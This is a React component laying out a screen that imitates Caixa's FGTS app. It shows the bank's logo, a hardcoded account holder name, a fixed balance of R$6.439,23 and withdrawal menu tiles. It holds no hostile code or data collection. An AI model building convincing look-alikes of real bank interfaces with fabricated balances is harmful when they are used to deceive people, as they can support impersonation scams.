import { RiExchangeDollarFill } from "react-icons/ri";
import logo from "../assets/caixalogo.png";
import fgts from "../assets/fgts2.png";
import { FaAngleRight } from "react-icons/fa";
import { OverlayNavigation } from "../components/overlay-nav"; // Importing the overlay component

export function Menu() {
    return (
        <div className="w-screen h-screen flex flex-col items-center text-white">
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, VICTOR</span>
                    </div>
                    <img src={fgts} alt="fgt" width={65} />
                </div>

                <div className="flex flex-col space-y-3">
                    <div className="flex items-center space-x-2">
                        <div className="bg-orange-400 p-1 rounded-full w-fit">
                            <RiExchangeDollarFill size={30} />
                        </div>
                        <h2 className="font-bold text-xl">SALDO TOTAL</h2>
                    </div>

                    <div className="font-semibold text-3xl px-2">
                        R$6.439,23
                    </div>

                    <span className="border-b border-b-white" />
                </div>
            </header>

            <div className="rounded-lg bg-white w-full -mt-3">
                <div className="p-4 border-2 m-2 rounded-lg space-y-4">
                    <div className="flex items-center space-x-2">
                        <div className="bg-orange-400 p-1 rounded-full w-fit">FFF</div>
                        <h2 className="font-bold text-2xl text-zinc-700">
                            Resumo do seu FGTS
                        </h2>
                    </div>

                    <div className="font-bold text-xl flex flex-col space-y-2">
                        <div className="flex items-center justify-between text-[#025bab]">
                            <h3>VICTOR SOUZA ALMEIDA</h3>
                            <FaAngleRight />
                        </div>

                        <span className="text-zinc-700">R$6.439,23</span>
                    </div>
                    <span className="border-b border-b-zinc-800 my-2" />
                </div>
            </div>

            <div className="grid grid-cols-2 text-zinc-900 w-full gap-2 p-4">
                <div className="bg-orange-500 text-xl font-extralight text-white w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                    <div className="bg-white p-1 text-orange-500 rounded-full w-fit">FFF</div>
                    <div>
                        Solicite seu saque <span className="font-bold">100% digital</span>
                    </div>
                </div>

                <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                    <div className="bg-orange-500 p-1 text-white rounded-full w-fit">FFF</div>
                    <div>
                        <span className="font-bold">Conta bancária</span> para saque do
                        seu <span className="font-bold">FGTS</span>
                    </div>
                </div>

                <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                    <div className="bg-orange-500 p-1 text-white rounded-full w-fit">FFF</div>
                    <div>
                        <span className="font-bold">Sistemática de saque </span> do seu
                        <span className="font-bold"> FGTS</span>
                    </div>
                </div>

                <div className="text-xl font-extralight text-[#025bab] w-44 h-40 rounded-lg border-2 flex flex-col items-center text-center justify-center space-y-2">
                    <div className="bg-orange-500 p-1 text-white rounded-full w-fit">FFF</div>
                    <div>
                        Informações <span className="font-bold">úteis</span>
                    </div>
                </div>
            </div>

            {/* Overlay Navigation */}
            <OverlayNavigation
                activeOption="Principal"
            />
        </div>
    );
}
